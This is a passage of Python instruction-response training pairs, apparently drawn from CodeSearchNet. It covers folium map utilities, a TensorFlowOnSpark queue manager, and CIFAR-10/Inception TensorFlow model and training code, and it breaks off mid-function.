{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ntransform an image computed in (longitude,latitude) coordinates into the a Mercator projection image. Parameters ---------- data: numpy array or equivalent list-like object. Must be NxM (mono), NxMx3 (RGB) or NxMx4 (RGBA) lat_bounds : length 2 tuple Minimal and maximal value of the latitude of the image. Bounds must be between -85.051128779806589 and 85.051128779806589 otherwise they will be clipped to that values. origin : ['upper' | 'lower'], optional, default 'upper' Place the [0,0] index of the array in the upper left or lower left corner of the axes. height_out : int, default None The expected height of the output. If None, the height of the input is used. See https://en.wikipedia.org/wiki/Web_Mercator for more details.", "response": "def mercator_transform(data, lat_bounds, origin='upper', height_out=None):\n    \"\"\"\n    Transforms an image computed in (longitude,latitude) coordinates into\n    the a Mercator projection image.\n\n    Parameters\n    ----------\n\n    data: numpy array or equivalent list-like object.\n        Must be NxM (mono), NxMx3 (RGB) or NxMx4 (RGBA)\n\n    lat_bounds : length 2 tuple\n        Minimal and maximal value of the latitude of the image.\n        Bounds must be between -85.051128779806589 and 85.051128779806589\n        otherwise they will be clipped to that values.\n\n    origin : ['upper' | 'lower'], optional, default 'upper'\n        Place the [0,0] index of the array in the upper left or lower left\n        corner of the axes.\n\n    height_out : int, default None\n        The expected height of the output.\n        If None, the height of the input is used.\n\n    See https://en.wikipedia.org/wiki/Web_Mercator for more details.\n\n    \"\"\"\n    import numpy as np\n\n    def mercator(x):\n        return np.arcsinh(np.tan(x*np.pi/180.))*180./np.pi\n\n    array = np.atleast_3d(data).copy()\n    height, width, nblayers = array.shape\n\n    lat_min = max(lat_bounds[0], -85.051128779806589)\n    lat_max = min(lat_bounds[1], 85.051128779806589)\n    if height_out is None:\n        height_out = height\n\n    # Eventually flip the image\n    if origin == 'upper':\n        array = array[::-1, :, :]\n\n    lats = (lat_min + np.linspace(0.5/height, 1.-0.5/height, height) *\n            (lat_max-lat_min))\n    latslats = (mercator(lat_min) +\n                np.linspace(0.5/height_out, 1.-0.5/height_out, height_out) *\n                (mercator(lat_max)-mercator(lat_min)))\n\n    out = np.zeros((height_out, width, nblayers))\n    for i in range(width):\n        for j in range(nblayers):\n            out[:, i, j] = np.interp(latslats, mercator(lats),  array[:, i, j])\n\n    # Eventually flip the image.\n    if origin == 'upper':\n        out = out[::-1, :, :]\n    return out"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\niterates over all the coordinate tuples from a geometry or feature.", "response": "def iter_coords(obj):\n    \"\"\"\n    Returns all the coordinate tuples from a geometry or feature.\n\n    \"\"\"\n    if isinstance(obj, (tuple, list)):\n        coords = obj\n    elif 'features' in obj:\n        coords = [geom['geometry']['coordinates'] for geom in obj['features']]\n    elif 'geometry' in obj:\n        coords = obj['geometry']['coordinates']\n    else:\n        coords = obj.get('coordinates', obj)\n    for coord in coords:\n        if isinstance(coord, (float, int)):\n            yield tuple(coords)\n            break\n        else:\n            for f in iter_coords(coord):\n                yield f"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmirror the points in a list - of - list - of - points.", "response": "def _locations_mirror(x):\n    \"\"\"\n    Mirrors the points in a list-of-list-of-...-of-list-of-points.\n    For example:\n    >>> _locations_mirror([[[1, 2], [3, 4]], [5, 6], [7, 8]])\n    [[[2, 1], [4, 3]], [6, 5], [8, 7]]\n\n    \"\"\"\n    if hasattr(x, '__iter__'):\n        if hasattr(x[0], '__iter__'):\n            return list(map(_locations_mirror, x))\n        else:\n            return list(x[::-1])\n    else:\n        return x"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_bounds(locations, lonlat=False):\n    bounds = [[None, None], [None, None]]\n    for point in iter_coords(locations):\n        bounds = [\n            [\n                none_min(bounds[0][0], point[0]),\n                none_min(bounds[0][1], point[1]),\n            ],\n            [\n                none_max(bounds[1][0], point[0]),\n                none_max(bounds[1][1], point[1]),\n            ],\n        ]\n    if lonlat:\n        bounds = _locations_mirror(bounds)\n    return bounds", "response": "Returns the bounds of the object in the form of a sequence of locations."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts a python_style_variable_name to lowerCamelCase.", "response": "def camelize(key):\n    \"\"\"Convert a python_style_variable_name to lowerCamelCase.\n\n    Examples\n    --------\n    >>> camelize('variable_name')\n    'variableName'\n    >>> camelize('variableName')\n    'variableName'\n    \"\"\"\n    return ''.join(x.capitalize() if i > 0 else x\n                   for i, x in enumerate(key.split('_')))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef normalize(rendered):\n    out = ''.join([line.strip()\n                   for line in rendered.splitlines()\n                   if line.strip()])\n    out = out.replace(', ', ',')\n    return out", "response": "Return the input string without non - functional spaces or newlines."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _tmp_html(data):\n    filepath = ''\n    try:\n        fid, filepath = tempfile.mkstemp(suffix='.html', prefix='folium_')\n        os.write(fid, data.encode('utf8'))\n        os.close(fid)\n        yield filepath\n    finally:\n        if os.path.isfile(filepath):\n            os.remove(filepath)", "response": "Yields the path of a temporary HTML file containing data."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a recursive deep - copy of item where each copy has a new ID.", "response": "def deep_copy(item_original):\n    \"\"\"Return a recursive deep-copy of item where each copy has a new ID.\"\"\"\n    item = copy.copy(item_original)\n    item._id = uuid.uuid4().hex\n    if hasattr(item, '_children') and len(item._children) > 0:\n        children_new = collections.OrderedDict()\n        for subitem_original in item._children.values():\n            subitem = deep_copy(subitem_original)\n            subitem._parent = item\n            children_new[subitem.get_name()] = subitem\n        item._children = children_new\n    return item"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_obj_in_upper_tree(element, cls):\n    if not hasattr(element, '_parent'):\n        raise ValueError('The top of the tree was reached without finding a {}'\n                         .format(cls))\n    parent = element._parent\n    if not isinstance(parent, cls):\n        return get_obj_in_upper_tree(parent, cls)\n    return parent", "response": "Return the first object in the parent tree of class cls."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a dict with lower - camelcase keys and non - None values..", "response": "def parse_options(**kwargs):\n    \"\"\"Return a dict with lower-camelcase keys and non-None values..\"\"\"\n    return {camelize(key): value\n            for key, value in kwargs.items()\n            if value is not None}"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef render(self, **kwargs):\n        for item in self._parent._children.values():\n            if not isinstance(item, Layer) or not item.control:\n                continue\n            key = item.layer_name\n            if not item.overlay:\n                self.base_layers[key] = item.get_name()\n                if len(self.base_layers) > 1:\n                    self.layers_untoggle[key] = item.get_name()\n            else:\n                self.overlays[key] = item.get_name()\n                if not item.show:\n                    self.layers_untoggle[key] = item.get_name()\n        super(LayerControl, self).render()", "response": "Renders the HTML representation of the element."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef render(self, **kwargs):\n        for name, child in self._children.items():\n            child.render(**kwargs)\n\n        figure = self.get_root()\n        assert isinstance(figure, Figure), ('You cannot render this Element '\n                                            'if it is not in a Figure.')\n\n        figure.script.add_child(Element(\n            self._template.render(this=self, kwargs=kwargs)),\n            name=self.get_name())", "response": "Renders the HTML representation of the element."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_options(self, kwargs):\n        kwargs = {camelize(key): value for key, value in kwargs.items()}\n        for key in kwargs.keys():\n            assert key in self.valid_options, (\n                'The option {} is not in the available options: {}.'\n                .format(key, ', '.join(self.valid_options))\n            )\n            assert isinstance(kwargs[key], self.valid_options[key]), (\n                'The option {} must be one of the following types: {}.'\n                .format(key, self.valid_options[key])\n            )\n        return kwargs", "response": "Validate the provided kwargs and return options as json string."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _repr_html_(self, **kwargs):\n        if self._parent is None:\n            self.add_to(Figure())\n            out = self._parent._repr_html_(**kwargs)\n            self._parent = None\n        else:\n            out = self._parent._repr_html_(**kwargs)\n        return out", "response": "Displays the HTML Map in a Jupyter notebook."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nexport the HTML to byte representation of a PNG image.", "response": "def _to_png(self, delay=3):\n        \"\"\"Export the HTML to byte representation of a PNG image.\n\n        Uses selenium to render the HTML and record a PNG. You may need to\n        adjust the `delay` time keyword argument if maps render without data or tiles.\n\n        Examples\n        --------\n        >>> m._to_png()\n        >>> m._to_png(time=10)  # Wait 10 seconds between render and snapshot.\n\n        \"\"\"\n        if self._png_image is None:\n            from selenium import webdriver\n\n            options = webdriver.firefox.options.Options()\n            options.add_argument('--headless')\n            driver = webdriver.Firefox(options=options)\n\n            html = self.get_root().render()\n            with _tmp_html(html) as fname:\n                # We need the tempfile to avoid JS security issues.\n                driver.get('file:///{path}'.format(path=fname))\n                driver.maximize_window()\n                time.sleep(delay)\n                png = driver.get_screenshot_as_png()\n                driver.quit()\n            self._png_image = png\n        return self._png_image"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nrenders the HTML representation of the element.", "response": "def render(self, **kwargs):\n        \"\"\"Renders the HTML representation of the element.\"\"\"\n        figure = self.get_root()\n        assert isinstance(figure, Figure), ('You cannot render this Element '\n                                            'if it is not in a Figure.')\n\n        # Set global switches\n        figure.header.add_child(self.global_switches, name='global_switches')\n\n        # Import Javascripts\n        for name, url in _default_js:\n            figure.header.add_child(JavascriptLink(url), name=name)\n\n        # Import Css\n        for name, url in _default_css:\n            figure.header.add_child(CssLink(url), name=name)\n\n        figure.header.add_child(Element(\n            '<style>html, body {'\n            'width: 100%;'\n            'height: 100%;'\n            'margin: 0;'\n            'padding: 0;'\n            '}'\n            '</style>'), name='css_style')\n\n        figure.header.add_child(Element(\n            '<style>#map {'\n            'position:absolute;'\n            'top:0;'\n            'bottom:0;'\n            'right:0;'\n            'left:0;'\n            '}'\n            '</style>'), name='map_style')\n\n        super(Map, self).render(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fit_bounds(self, bounds, padding_top_left=None,\n                   padding_bottom_right=None, padding=None, max_zoom=None):\n        \"\"\"Fit the map to contain a bounding box with the\n        maximum zoom level possible.\n\n        Parameters\n        ----------\n        bounds: list of (latitude, longitude) points\n            Bounding box specified as two points [southwest, northeast]\n        padding_top_left: (x, y) point, default None\n            Padding in the top left corner. Useful if some elements in\n            the corner, such as controls, might obscure objects you're zooming\n            to.\n        padding_bottom_right: (x, y) point, default None\n            Padding in the bottom right corner.\n        padding: (x, y) point, default None\n            Equivalent to setting both top left and bottom right padding to\n            the same value.\n        max_zoom: int, default None\n            Maximum zoom to be used.\n\n        Examples\n        --------\n        >>> m.fit_bounds([[52.193636, -2.221575], [52.636878, -1.139759]])\n\n        \"\"\"\n        self.add_child(FitBounds(bounds,\n                                 padding_top_left=padding_top_left,\n                                 padding_bottom_right=padding_bottom_right,\n                                 padding=padding,\n                                 max_zoom=max_zoom,\n                                 )\n                       )", "response": "Fit the map to contain a bounding box with the maximum zoom level possible."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncall the Choropleth method with the same arguments.", "response": "def choropleth(self, *args, **kwargs):\n        \"\"\"Call the Choropleth class with the same arguments.\n\n        This method may be deleted after a year from now (Nov 2018).\n        \"\"\"\n        warnings.warn(\n            'The choropleth  method has been deprecated. Instead use the new '\n            'Choropleth class, which has the same arguments. See the example '\n            'notebook \\'GeoJSON_and_choropleth\\' for how to do this.',\n            FutureWarning\n        )\n        from folium.features import Choropleth\n        self.add_child(Choropleth(*args, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncomputing the bounds of the object itself and its children.", "response": "def _get_self_bounds(self):\n        \"\"\"\n        Computes the bounds of the object itself (not including it's children)\n        in the form [[lat_min, lon_min], [lat_max, lon_max]].\n\n        \"\"\"\n        if not self.embed:\n            raise ValueError('Cannot compute bounds of non-embedded GeoJSON.')\n\n        data = json.loads(self.data)\n        if 'features' not in data.keys():\n            # Catch case when GeoJSON is just a single Feature or a geometry.\n            if not (isinstance(data, dict) and 'geometry' in data.keys()):\n                # Catch case when GeoJSON is just a geometry.\n                data = {'type': 'Feature', 'geometry': data}\n            data = {'type': 'FeatureCollection', 'features': [data]}\n\n        bounds = [[None, None], [None, None]]\n        for feature in data['features']:\n            for point in iter_points(feature.get('geometry', {}).get('coordinates', {})):  # noqa\n                bounds = [\n                    [\n                        none_min(bounds[0][0], point[1]),\n                        none_min(bounds[0][1], point[0]),\n                        ],\n                    [\n                        none_max(bounds[1][0], point[1]),\n                        none_max(bounds[1][1], point[0]),\n                        ],\n                    ]\n        return bounds"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_child(self, child, name=None, index=None):\n        self.m1.add_child(child, name, index)\n        if index is None:\n            index = len(self.m2._children)\n        self.children_for_m2.append((child, name, index))", "response": "Add object child to the first map and store it for the second."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef start(authkey, queues, mode='local'):\n  global mgr, qdict, kdict\n  qdict.clear()\n  kdict.clear()\n  for q in queues:\n    qdict[q] = JoinableQueue()\n\n  TFManager.register('get_queue', callable=lambda qname: _get_queue(qname))\n  TFManager.register('get', callable=lambda key: _get(key))\n  TFManager.register('set', callable=lambda key, value: _set(key, value))\n  if mode == 'remote':\n    mgr = TFManager(address=('', 0), authkey=authkey)\n  else:\n    mgr = TFManager(authkey=authkey)\n  mgr.start()\n  return mgr", "response": "Create a new multiprocess. Manager instance and return it."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef connect(address, authkey):\n  TFManager.register('get_queue')\n  TFManager.register('get')\n  TFManager.register('set')\n  m = TFManager(address, authkey=authkey)\n  m.connect()\n  return m", "response": "Connect to a multiprocess. Manager.\n"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef ProcessXMLAnnotation(xml_file):\n  # pylint: disable=broad-except\n  try:\n    tree = ET.parse(xml_file)\n  except Exception:\n    print('Failed to parse: ' + xml_file, file=sys.stderr)\n    return None\n  # pylint: enable=broad-except\n  root = tree.getroot()\n\n  num_boxes = FindNumberBoundingBoxes(root)\n  boxes = []\n\n  for index in range(num_boxes):\n    box = BoundingBox()\n    # Grab the 'index' annotation.\n    box.xmin = GetInt('xmin', root, index)\n    box.ymin = GetInt('ymin', root, index)\n    box.xmax = GetInt('xmax', root, index)\n    box.ymax = GetInt('ymax', root, index)\n\n    box.width = GetInt('width', root)\n    box.height = GetInt('height', root)\n    box.filename = GetItem('filename', root) + '.JPEG'\n    box.label = GetItem('name', root)\n\n    xmin = float(box.xmin) / float(box.width)\n    xmax = float(box.xmax) / float(box.width)\n    ymin = float(box.ymin) / float(box.height)\n    ymax = float(box.ymax) / float(box.height)\n\n    # Some images contain bounding box annotations that\n    # extend outside of the supplied image. See, e.g.\n    # n03127925/n03127925_147.xml\n    # Additionally, for some bounding boxes, the min > max\n    # or the box is entirely outside of the image.\n    min_x = min(xmin, xmax)\n    max_x = max(xmin, xmax)\n    box.xmin_scaled = min(max(min_x, 0.0), 1.0)\n    box.xmax_scaled = min(max(max_x, 0.0), 1.0)\n\n    min_y = min(ymin, ymax)\n    max_y = max(ymin, ymax)\n    box.ymin_scaled = min(max(min_y, 0.0), 1.0)\n    box.ymax_scaled = min(max(max_y, 0.0), 1.0)\n\n    boxes.append(box)\n\n  return boxes", "response": "Processes a single XML file containing a bounding box."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef data_files(self):\n    tf_record_pattern = os.path.join(FLAGS.data_dir, '%s-*' % self.subset)\n    data_files = tf.gfile.Glob(tf_record_pattern)\n    if not data_files:\n      print('No files found for dataset %s/%s at %s' % (self.name,\n                                                        self.subset,\n                                                        FLAGS.data_dir))\n\n      self.download_message()\n      exit(-1)\n    return data_files", "response": "Returns a python list of all data files in the dataset that match the subset."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _variable_on_cpu(name, shape, initializer):\n  with tf.device('/cpu:0'):\n    dtype = tf.float16 if FLAGS.use_fp16 else tf.float32\n    var = tf.get_variable(name, shape, initializer=initializer, dtype=dtype)\n  return var", "response": "Helper to create a Variable stored on CPU memory."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _variable_with_weight_decay(name, shape, stddev, wd):\n  dtype = tf.float16 if FLAGS.use_fp16 else tf.float32\n  var = _variable_on_cpu(\n      name,\n      shape,\n      tf.truncated_normal_initializer(stddev=stddev, dtype=dtype))\n  if wd is not None:\n    weight_decay = tf.multiply(tf.nn.l2_loss(var), wd, name='weight_loss')\n    tf.add_to_collection('losses', weight_decay)\n  return var", "response": "Helper to create an initialized Variable with weight decay."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconstructing distorted input for CIFAR training using the Reader ops.", "response": "def distorted_inputs():\n  \"\"\"Construct distorted input for CIFAR training using the Reader ops.\n\n  Returns:\n    images: Images. 4D tensor of [batch_size, IMAGE_SIZE, IMAGE_SIZE, 3] size.\n    labels: Labels. 1D tensor of [batch_size] size.\n\n  Raises:\n    ValueError: If no data_dir\n  \"\"\"\n  if not FLAGS.data_dir:\n    raise ValueError('Please supply a data_dir')\n  data_dir = os.path.join(FLAGS.data_dir, 'cifar-10-batches-bin')\n  images, labels = cifar10_input.distorted_inputs(data_dir=data_dir,\n                                                  batch_size=FLAGS.batch_size)\n  if FLAGS.use_fp16:\n    images = tf.cast(images, tf.float16)\n    labels = tf.cast(labels, tf.float16)\n  return images, labels"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef inference(images):\n  # We instantiate all variables using tf.get_variable() instead of\n  # tf.Variable() in order to share variables across multiple GPU training runs.\n  # If we only ran this model on a single GPU, we could simplify this function\n  # by replacing all instances of tf.get_variable() with tf.Variable().\n  #\n  # conv1\n  with tf.variable_scope('conv1') as scope:\n    kernel = _variable_with_weight_decay('weights',\n                                         shape=[5, 5, 3, 64],\n                                         stddev=5e-2,\n                                         wd=0.0)\n    conv = tf.nn.conv2d(images, kernel, [1, 1, 1, 1], padding='SAME')\n    biases = _variable_on_cpu('biases', [64], tf.constant_initializer(0.0))\n    pre_activation = tf.nn.bias_add(conv, biases)\n    conv1 = tf.nn.relu(pre_activation, name=scope.name)\n    _activation_summary(conv1)\n\n  # pool1\n  pool1 = tf.nn.max_pool(conv1, ksize=[1, 3, 3, 1], strides=[1, 2, 2, 1],\n                         padding='SAME', name='pool1')\n  # norm1\n  norm1 = tf.nn.lrn(pool1, 4, bias=1.0, alpha=0.001 / 9.0, beta=0.75,\n                    name='norm1')\n\n  # conv2\n  with tf.variable_scope('conv2') as scope:\n    kernel = _variable_with_weight_decay('weights',\n                                         shape=[5, 5, 64, 64],\n                                         stddev=5e-2,\n                                         wd=0.0)\n    conv = tf.nn.conv2d(norm1, kernel, [1, 1, 1, 1], padding='SAME')\n    biases = _variable_on_cpu('biases', [64], tf.constant_initializer(0.1))\n    pre_activation = tf.nn.bias_add(conv, biases)\n    conv2 = tf.nn.relu(pre_activation, name=scope.name)\n    _activation_summary(conv2)\n\n  # norm2\n  norm2 = tf.nn.lrn(conv2, 4, bias=1.0, alpha=0.001 / 9.0, beta=0.75,\n                    name='norm2')\n  # pool2\n  pool2 = tf.nn.max_pool(norm2, ksize=[1, 3, 3, 1],\n                         strides=[1, 2, 2, 1], padding='SAME', name='pool2')\n\n  # local3\n  with tf.variable_scope('local3') as scope:\n    # Move everything into depth so we can perform a single matrix multiply.\n    reshape = tf.reshape(pool2, [FLAGS.batch_size, -1])\n    dim = reshape.get_shape()[1].value\n    weights = _variable_with_weight_decay('weights', shape=[dim, 384],\n                                          stddev=0.04, wd=0.004)\n    biases = _variable_on_cpu('biases', [384], tf.constant_initializer(0.1))\n    local3 = tf.nn.relu(tf.matmul(reshape, weights) + biases, name=scope.name)\n    _activation_summary(local3)\n\n  # local4\n  with tf.variable_scope('local4') as scope:\n    weights = _variable_with_weight_decay('weights', shape=[384, 192],\n                                          stddev=0.04, wd=0.004)\n    biases = _variable_on_cpu('biases', [192], tf.constant_initializer(0.1))\n    local4 = tf.nn.relu(tf.matmul(local3, weights) + biases, name=scope.name)\n    _activation_summary(local4)\n\n  # linear layer(WX + b),\n  # We don't apply softmax here because\n  # tf.nn.sparse_softmax_cross_entropy_with_logits accepts the unscaled logits\n  # and performs the softmax internally for efficiency.\n  with tf.variable_scope('softmax_linear') as scope:\n    weights = _variable_with_weight_decay('weights', [192, NUM_CLASSES],\n                                          stddev=1/192.0, wd=0.0)\n    biases = _variable_on_cpu('biases', [NUM_CLASSES],\n                              tf.constant_initializer(0.0))\n    softmax_linear = tf.add(tf.matmul(local4, weights), biases, name=scope.name)\n    _activation_summary(softmax_linear)\n\n  return softmax_linear", "response": "Build the CIFAR - 10 model."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nadding L2Loss to all the trainable variables.", "response": "def loss(logits, labels):\n  \"\"\"Add L2Loss to all the trainable variables.\n\n  Add summary for \"Loss\" and \"Loss/avg\".\n  Args:\n    logits: Logits from inference().\n    labels: Labels from distorted_inputs or inputs(). 1-D tensor\n            of shape [batch_size]\n\n  Returns:\n    Loss tensor of type float.\n  \"\"\"\n  # Calculate the average cross entropy loss across the batch.\n  labels = tf.cast(labels, tf.int64)\n  cross_entropy = tf.nn.sparse_softmax_cross_entropy_with_logits(\n      labels=labels, logits=logits, name='cross_entropy_per_example')\n  cross_entropy_mean = tf.reduce_mean(cross_entropy, name='cross_entropy')\n  tf.add_to_collection('losses', cross_entropy_mean)\n\n  # The total loss is defined as the cross entropy loss plus all of the weight\n  # decay terms (L2 loss).\n  return tf.add_n(tf.get_collection('losses'), name='total_loss')"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _add_loss_summaries(total_loss):\n  # Compute the moving average of all individual losses and the total loss.\n  loss_averages = tf.train.ExponentialMovingAverage(0.9, name='avg')\n  losses = tf.get_collection('losses')\n  loss_averages_op = loss_averages.apply(losses + [total_loss])\n\n  # Attach a scalar summary to all individual losses and the total loss; do the\n  # same for the averaged version of the losses.\n  for l in losses + [total_loss]:\n    # Name each loss as '(raw)' and name the moving average version of the loss\n    # as the original loss name.\n    tf.summary.scalar(l.op.name + ' (raw)', l)\n    tf.summary.scalar(l.op.name, loss_averages.average(l))\n\n  return loss_averages_op", "response": "Adds summaries for all losses and associated summaries for the total loss."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ntrains CIFAR - 10 model.", "response": "def train(total_loss, global_step):\n  \"\"\"Train CIFAR-10 model.\n\n  Create an optimizer and apply to all trainable variables. Add moving\n  average for all trainable variables.\n\n  Args:\n    total_loss: Total loss from loss().\n    global_step: Integer Variable counting the number of training steps\n      processed.\n  Returns:\n    train_op: op for training.\n  \"\"\"\n  # Variables that affect learning rate.\n  num_batches_per_epoch = NUM_EXAMPLES_PER_EPOCH_FOR_TRAIN / FLAGS.batch_size\n  decay_steps = int(num_batches_per_epoch * NUM_EPOCHS_PER_DECAY)\n\n  # Decay the learning rate exponentially based on the number of steps.\n  lr = tf.train.exponential_decay(INITIAL_LEARNING_RATE,\n                                  global_step,\n                                  decay_steps,\n                                  LEARNING_RATE_DECAY_FACTOR,\n                                  staircase=True)\n  tf.summary.scalar('learning_rate', lr)\n\n  # Generate moving averages of all losses and associated summaries.\n  loss_averages_op = _add_loss_summaries(total_loss)\n\n  # Compute gradients.\n  with tf.control_dependencies([loss_averages_op]):\n    opt = tf.train.GradientDescentOptimizer(lr)\n    grads = opt.compute_gradients(total_loss)\n\n  # Apply gradients.\n  apply_gradient_op = opt.apply_gradients(grads, global_step=global_step)\n\n  # Add histograms for trainable variables.\n  for var in tf.trainable_variables():\n    tf.summary.histogram(var.op.name, var)\n\n  # Add histograms for gradients.\n  for grad, var in grads:\n    if grad is not None:\n      tf.summary.histogram(var.op.name + '/gradients', grad)\n\n  # Track the moving averages of all trainable variables.\n  variable_averages = tf.train.ExponentialMovingAverage(\n      MOVING_AVERAGE_DECAY, global_step)\n  variables_averages_op = variable_averages.apply(tf.trainable_variables())\n\n  with tf.control_dependencies([apply_gradient_op, variables_averages_op]):\n    train_op = tf.no_op(name='train')\n\n  return train_op"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add_variable(var, restore=True):\n  collections = [MODEL_VARIABLES]\n  if restore:\n    collections.append(VARIABLES_TO_RESTORE)\n  for collection in collections:\n    if var not in tf.get_collection(collection):\n      tf.add_to_collection(collection, var)", "response": "Adds a variable to the MODEL_VARIABLES collection."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_variables(scope=None, suffix=None):\n  candidates = tf.get_collection(MODEL_VARIABLES, scope)[:]\n  if suffix is not None:\n    candidates = [var for var in candidates if var.op.name.endswith(suffix)]\n  return candidates", "response": "Gets the list of variables filtered by scope and suffix."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets the variable uniquely identified by that name.", "response": "def get_unique_variable(name):\n  \"\"\"Gets the variable uniquely identified by that name.\n\n  Args:\n    name: a name that uniquely identifies the variable.\n\n  Returns:\n    a tensorflow variable.\n\n  Raises:\n    ValueError: if no variable uniquely identified by the name exists.\n  \"\"\"\n  candidates = tf.get_collection(tf.GraphKeys.GLOBAL_VARIABLES, name)\n  if not candidates:\n    raise ValueError('Couldnt find variable %s' % name)\n\n  for candidate in candidates:\n    if candidate.op.name == name:\n      return candidate\n  raise ValueError('Variable %s does not uniquely identify a variable', name)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfixing the variable device to colocate its ops.", "response": "def variable_device(device, name):\n  \"\"\"Fix the variable device to colocate its ops.\"\"\"\n  if callable(device):\n    var_name = tf.get_variable_scope().name + '/' + name\n    var_def = tf.NodeDef(name=var_name, op='Variable')\n    device = device(var_def)\n  if device is None:\n    device = ''\n  return device"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef global_step(device=''):\n  global_step_ref = tf.get_collection(tf.GraphKeys.GLOBAL_STEP)\n  if global_step_ref:\n    return global_step_ref[0]\n  else:\n    collections = [\n        VARIABLES_TO_RESTORE,\n        tf.GraphKeys.GLOBAL_VARIABLES,\n        tf.GraphKeys.GLOBAL_STEP,\n    ]\n    # Get the device for the variable.\n    with tf.device(variable_device(device, 'global_step')):\n      return tf.get_variable('global_step', shape=[], dtype=tf.int64,\n                             initializer=tf.zeros_initializer(),\n                             trainable=False, collections=collections)", "response": "Returns the global step variable."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting an existing variable with these parameters or creates a new one.", "response": "def variable(name, shape=None, dtype=tf.float32, initializer=None,\n             regularizer=None, trainable=True, collections=None, device='',\n             restore=True):\n  \"\"\"Gets an existing variable with these parameters or creates a new one.\n\n    It also add itself to a group with its name.\n\n  Args:\n    name: the name of the new or existing variable.\n    shape: shape of the new or existing variable.\n    dtype: type of the new or existing variable (defaults to `DT_FLOAT`).\n    initializer: initializer for the variable if one is created.\n    regularizer: a (Tensor -> Tensor or None) function; the result of\n        applying it on a newly created variable will be added to the collection\n        GraphKeys.REGULARIZATION_LOSSES and can be used for regularization.\n    trainable: If `True` also add the variable to the graph collection\n      `GraphKeys.TRAINABLE_VARIABLES` (see tf.Variable).\n    collections: A list of collection names to which the Variable will be added.\n      Note that the variable is always also added to the tf.GraphKeys.GLOBAL_VARIABLES\n      and MODEL_VARIABLES collections.\n    device: Optional device to place the variable. It can be an string or a\n      function that is called to get the device for the variable.\n    restore: whether the variable should be added to the\n      VARIABLES_TO_RESTORE collection.\n\n  Returns:\n    The created or existing variable.\n  \"\"\"\n  collections = list(collections or [])\n\n  # Make sure variables are added to tf.GraphKeys.GLOBAL_VARIABLES and MODEL_VARIABLES\n  collections += [tf.GraphKeys.GLOBAL_VARIABLES, MODEL_VARIABLES]\n  # Add to VARIABLES_TO_RESTORE if necessary\n  if restore:\n    collections.append(VARIABLES_TO_RESTORE)\n  # Remove duplicates\n  collections = set(collections)\n  # Get the device for the variable.\n  with tf.device(variable_device(device, name)):\n    return tf.get_variable(name, shape=shape, dtype=dtype,\n                           initializer=initializer, regularizer=regularizer,\n                           trainable=trainable, collections=collections)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _eval_once(saver, summary_writer, top_1_op, top_5_op, summary_op):\n  with tf.Session() as sess:\n    ckpt = tf.train.get_checkpoint_state(FLAGS.checkpoint_dir)\n    if ckpt and ckpt.model_checkpoint_path:\n      print(\"ckpt.model_checkpoint_path: {0}\".format(ckpt.model_checkpoint_path))\n      saver.restore(sess, ckpt.model_checkpoint_path)\n\n      # Assuming model_checkpoint_path looks something like:\n      #   /my-favorite-path/imagenet_train/model.ckpt-0,\n      # extract global_step from it.\n      global_step = ckpt.model_checkpoint_path.split('/')[-1].split('-')[-1]\n      print('Successfully loaded model from %s at step=%s.' %\n            (ckpt.model_checkpoint_path, global_step))\n    else:\n      print('No checkpoint file found')\n      return\n\n    # Start the queue runners.\n    coord = tf.train.Coordinator()\n    try:\n      threads = []\n      for qr in tf.get_collection(tf.GraphKeys.QUEUE_RUNNERS):\n        threads.extend(qr.create_threads(sess, coord=coord, daemon=True,\n                                         start=True))\n\n      num_iter = int(math.ceil(FLAGS.num_examples / FLAGS.batch_size))\n      # Counts the number of correct predictions.\n      count_top_1 = 0.0\n      count_top_5 = 0.0\n      